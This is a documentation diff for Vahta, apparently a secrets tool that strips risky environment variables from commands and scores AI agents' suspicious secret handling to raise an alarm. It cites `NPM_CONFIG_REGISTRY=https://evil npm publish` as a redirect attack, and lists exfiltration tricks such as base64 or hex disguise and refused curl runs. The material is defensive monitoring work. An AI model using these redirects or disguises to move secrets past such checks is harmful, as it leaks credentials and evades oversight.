@@ -171,7 +171,20 @@ vahta run --secret API_KEY --as API_KEY=SERVICE_TOKEN -- ./deploy.sh
   session.
 - **The command** gets your arguments, working directory and environment, minus
   `LD_PRELOAD`, `LD_AUDIT`, `LD_LIBRARY_PATH`, `DYLD_*` and `VAHTA_*`, plus the
-  secrets. Standard input is relayed, Ctrl-C and termination are forwarded, the
+  secrets. For a secret of the `publish` or `payment` category the environment
+  is cut down further: only the category's `env_keep` list (compiled in:
+  `crates/policy/categories`), the injected variables and `PATH`, `HOME`,
+  `USER`, `LOGNAME`, `LANG`, `LC_*`, `TERM`, `TMPDIR`, `TZ` pass (with several
+  secrets, what every restricted category keeps), so
+  `NPM_CONFIG_REGISTRY=https://evil npm publish` runs without the variable. The
+  run window warns about dropped variables that could redirect the program
+  (`NPM_CONFIG_*`, `CARGO_REGISTR*`, `PIP_*`, proxies and the like) by name and
+  counts the rest; the journal does the same (never values). For any secret it
+  also shows, for any secret, the arguments beyond the allowed prefix
+  (`cargo publish --manifest-path /elsewhere/Cargo.toml` shows
+  `Extra arguments: --manifest-path /elsewhere/Cargo.toml`). A program's own
+  config files (`.npmrc`, `.cargo/config.toml`) can still redirect it; Vahta
+  does not read them. Standard input is relayed, Ctrl-C and termination are forwarded, the
   exit code passes through, and if `vahta run` is killed the command is ended.
 - **Output** comes back with every value replaced by `***REDACTED(NAME)***`.
   Matches are found even when a value is split across two reads, overlaps another
@@ -867,10 +880,17 @@ score per agent: the harness's session id when its payload has one, else the
 agent process. Weights: a refused secret 1, one let through in observe mode
 0.5, a refused secret that was hidden (base64, concatenation, hex, percent-encoding) 4, a held
 value in a tool call 6, a touch of Vahta's own files 3, a command for the person
-(`reveal`, `copy`) 2, a change to the hook settings 4. The score is the sum over
+(`reveal`, `copy`) 2, a change to the hook settings 4, a `vahta run` or
+`vahta http` refused by a secret's rules 3 (6 when the refused program is a
+network tool, a shell or an interpreter). The score is the sum over
 the last 10 minutes. At 6 the alarm goes off, at most once per agent per 10
 minutes. A held value in a tool call is enough alone; so are two disguised
-secrets.
+secrets, one refused `curl` (or shell, or interpreter) and any two refusals by
+rules. A secret that has no rules yet is a setup issue, not an attack: that
+refusal only ever counts as one of the two. A run refused for rules is shown to
+the person as "a run of `curl` with NAME (refused by its rules)"; the agent's
+reply is the usual refusal and hint, nothing about the alarm. A run the person
+declined in an `--ask` window does not count.
 
 ### What happens
 
